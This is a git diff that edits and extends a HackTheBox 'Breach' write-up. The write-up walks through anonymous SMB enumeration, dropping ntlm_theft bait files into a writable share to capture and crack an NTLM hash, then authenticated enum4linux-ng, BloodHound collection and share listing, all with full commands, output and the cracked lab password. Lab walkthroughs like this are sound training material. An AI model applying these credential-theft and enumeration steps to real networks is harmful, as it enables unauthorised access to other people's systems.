@@ -93,7 +93,9 @@ ff02::2         ip6-allrouters
 
 ### Enum4linux
 
-I always like to run an initial scan with enum4linux-ng with no credentials, sometimes we could gather a low haning fruit. Besides, eum4linux provides us with valuable information, like the SID of the domain.
+I always like to start with an initial enum4linux-ng scan without credentials, sometimes you can grab some low-hanging fruit right away.
+
+Even if anonymous access is limited, enum4linux-ng can still provide useful information, such as the domain SID, basic domain details, SMB configuration, and sometimes even user or share information. It’s a quick win and helps build a clearer picture of the environment before moving into authenticated enumeration.
 
 ```bash
 ┌──(kali㉿kali)-[~/hackthebox/breach]
@@ -452,6 +454,7 @@ smb: \> ls
   Desktop.ini                       AHS      934  Sat May  8 04:18:35 2021
   File Explorer.lnk                   A      407  Sat May  8 04:14:58 2021
   Run.lnk                             A      409  Sat May  8 04:14:58 2021
+...
 ```
 
 The other share goes pretty deep, and it looks like it contains the default user configuration. It seems to be the template Windows uses when creating new user profiles. I took a quick look at it but it seemed more like a rabbit hole.
@@ -464,7 +467,7 @@ The idea is simple: create a file (like .lnk, .ini, .library-ms, .scf, etc.) tha
 
 When that happens, the machine attempts to authenticate to my SMB server, and with a tool like Responder, I can capture the NTLM challenge-response for offline cracking or relay attacks.
 
-For this, we'll use a very good tool named [ntlm_theft](https://github.com/Greenwolf/ntlm_theft), which automates most of this process.
+For this, we'll use a very reliable tool named [ntlm_theft](https://github.com/Greenwolf/ntlm_theft), which automates most of this process.
 
 The usage is super simple, clone the repository and run the python script.
 
@@ -491,7 +494,7 @@ Created: test/test.lnk (BROWSE TO FOLDER)
 Generation Complete.
 ```
 
-Alternatively, if it’s unclear which file extensions are actually being rendered, we can use the -g all option. This tells the tool to generate files for every supported extension.
+Alternatively, if it’s unclear which file extensions are actually being rendered, we can use the `-g all` option. This tells the tool to generate files for every supported extension.
 
 That way, we cover all possible triggers. We simply drop the full batch of generated files into the writable SMB share and wait and if Windows processes any of them automatically, we should receive an NTLM authentication attempt. 
 
@@ -567,9 +570,9 @@ After just some seconds, the hash cracked succesfully and we have the credential
 First thing I'll check with the newly obtained credentials is to run another enum4linux scan, as well as re-check the shares in smb. While we do this, it's good to let Bloodhound collect the data in the background.
 
 <details>
-<summary>enum4linux-ng Output</summary>
+<summary><strong>enum4linux-ng Output</strong></summary>
 
-```bash
+<pre><code>
 #
 ┌──(kali㉿kali)-[~/hackthebox/breach/ntlm_theft/test]
 └─$ enum4linux-ng -u julia.wong -p 'Computer1' breach.vl
@@ -981,4 +984,64 @@ Domain logoff information:
 [+] No printers available
 
 Completed after 20.85 seconds
+</code></pre>
+</details>
+
+Now we can see we have a lot more permissions. I'll take note of the users and groups, as well as other interesting information we could gather. I'll use bloodhound-python to collect the data to import it in bloodhound.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach/bh]
+└─$ bloodhound-python -c all,Group,Session,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL -d "breach.vl" -ns 10.129.8.90 -v -u julia.wong -p 'Computer1'
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+DEBUG: Authentication: username/password
+DEBUG: Resolved collection methods: dcom, loggedon, trusts, session, localadmin, objectprops, psremote, rdp, container, group, acl
+DEBUG: Using DNS to retrieve domain information
+DEBUG: Querying domain controller information from DNS
+DEBUG: Using domain hint: breach.vl
+....
 ```
+
+SMB wise, I'll check with nxc again.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach/bh]
+└─$ nxc smb breach.vl -u julia.wong -p 'Computer1' --shares   
+SMB         10.129.8.90     445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.8.90     445    BREACHDC         [+] breach.vl\julia.wong:Computer1 
+SMB         10.129.8.90     445    BREACHDC         [*] Enumerated shares
+SMB         10.129.8.90     445    BREACHDC         Share           Permissions     Remark
+SMB         10.129.8.90     445    BREACHDC         -----           -----------     ------
+SMB         10.129.8.90     445    BREACHDC         ADMIN$                          Remote Admin
+SMB         10.129.8.90     445    BREACHDC         C$                              Default share
+SMB         10.129.8.90     445    BREACHDC         IPC$            READ            Remote IPC
+SMB         10.129.8.90     445    BREACHDC         NETLOGON        READ            Logon server share 
+SMB         10.129.8.90     445    BREACHDC         share           READ,WRITE      
+SMB         10.129.8.90     445    BREACHDC         SYSVOL          READ            Logon server share 
+SMB         10.129.8.90     445    BREACHDC         Users           READ
+```
+
+If we go back a little, we had a directory under the name of julia.wong inside `"share"`, I'll check that out.
+
+```bash
+smb: \transfer\julia.wong\> ls
+  .                                   D        0  Wed Apr 16 20:38:12 2025
+  ..                                  D        0  Wed Feb 25 12:49:48 2026
+  user.txt                            A       32  Wed Apr 16 20:38:22 2025
+
+                7863807 blocks of size 4096. 1517795 blocks available
+smb: \transfer\julia.wong\> 
+```
+
+The user.txt is there, we just have to get it and read it.
+
+```bash
+smb: \transfer\julia.wong\> get user.txt
+getting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+smb: \transfer\julia.wong\> exit
+```
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach/bh]
+└─$ cat user.txt 
+55d33e....
+```
+
